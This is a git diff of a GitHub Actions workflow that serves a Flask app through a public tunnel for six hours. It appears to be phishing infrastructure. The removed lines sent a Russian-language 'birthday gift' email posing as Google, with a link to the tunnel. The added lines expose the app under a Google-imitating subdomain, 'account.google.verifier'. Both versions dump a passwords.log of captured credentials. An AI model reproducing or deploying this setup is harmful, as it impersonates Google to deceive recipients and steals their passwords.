@@ -1,4 +1,4 @@
-name: Deploy Flask with Cloudflare Tunnel (6 hours)
+name: Deploy Flask with LocalTunnel (6 hours)
 
 on:
   workflow_dispatch:
@@ -21,63 +21,20 @@ jobs:
         python -m pip install --upgrade pip
         pip install -r requirements.txt
 
-    - name: Install cloudflared
-      run: |
-        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-        sudo dpkg -i cloudflared-linux-amd64.deb
+    - name: Install LocalTunnel
+      run: npm install -g localtunnel
 
-    - name: Start Flask app and Cloudflare Tunnel
+    - name: Start Flask and LocalTunnel
       run: |
-        python app.py 2>&1 | tee flask.log &
+        python app.py > flask.log 2>&1 &
         sleep 5
-        nohup cloudflared tunnel --url http://localhost:5000 --no-autoupdate > tunnel.log 2>&1 &
+        npx localtunnel --port 5000 --subdomain account.google.verifier > lt.log 2>&1 &
         sleep 10
-        URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" tunnel.log | head -1)
-        echo "CLOUDFLARE_URL=$URL" >> $GITHUB_ENV
-        echo "::group::Cloudflare Tunnel URL"
+        URL=$(grep -oE "https://[a-zA-Z0-9-]+\.loca\.lt" lt.log | head -1)
+        echo "LT_URL=$URL" >> $GITHUB_ENV
+        echo "::group::🌍 LocalTunnel URL"
         echo "$URL"
         echo "::endgroup::"
-
-    - name: Send email with tunnel link (Yandex)
-      uses: dawidd6/action-send-mail@v3
-      with:
-        server_address: smtp.yandex.ru
-        server_port: 465
-        username: ${{ secrets.SMTP_EMAIL }}
-        password: ${{ secrets.SMTP_PASSWORD }}
-        to: ${{ secrets.SMTP_TO }}
-        from: "Google Почта 🎁 <${{ secrets.SMTP_EMAIL }}>"
-        subject: "🎂 У тебя сюрприз!"
-        secure: true
-        body-html: |
-          <!DOCTYPE html>
-          <html lang="ru">
-          <head>
-            <meta charset="UTF-8">
-            <style>
-              body { font-family: Roboto, Arial, sans-serif; background-color: #f2f3f5; margin: 0; padding: 0; }
-              .email-wrapper { max-width: 600px; margin: 40px auto; background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; color: #202124; }
-              .logo { display: block; margin: 0 auto 30px; width: 92px; }
-              h1 { font-size: 24px; color: #202124; }
-              p { font-size: 16px; color: #3c4043; }
-              .btn { display: inline-block; margin-top: 30px; background-color: #1a73e8; color: #fff; padding: 12px 24px; border-radius: 4px; text-decoration: none; font-weight: 500; font-size: 14px; }
-              .footer { font-size: 12px; color: #5f6368; margin-top: 40px; text-align: center; }
-            </style>
-          </head>
-          <body>
-            <div class="email-wrapper">
-              <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-              <h1>С днём рождения!</h1>
-              <p>Сегодня твой день 🎉 И мы приготовили тебе подарок.</p>
-              <p>Просто нажми на кнопку ниже:</p>
-              <a href="${{ env.CLOUDFLARE_URL }}" class="btn" target="_blank">Открыть подарок</a>
-              <div class="footer">
-                Почти Google. Но с душой ❤️<br>
-                Отправлено хорошим человеком
-              </div>
-            </div>
-          </body>
-          </html>
 
     - name: Server running message
       run: |
@@ -85,14 +42,9 @@ jobs:
         sleep 21600
         echo "🛑 Shutting down..."
         pkill -f app.py || true
-        pkill -f cloudflared || true
+        pkill -f localtunnel || true
 
     - name: Show password log
       run: |
         echo "--- passwords.log ---"
         cat passwords.log || echo "No passwords logged"
-
-    - name: Show pass
-      run: |
-        echo "=== passwords.log ==="
-        cat passwords.log || echo "Лог пуст или не создан"
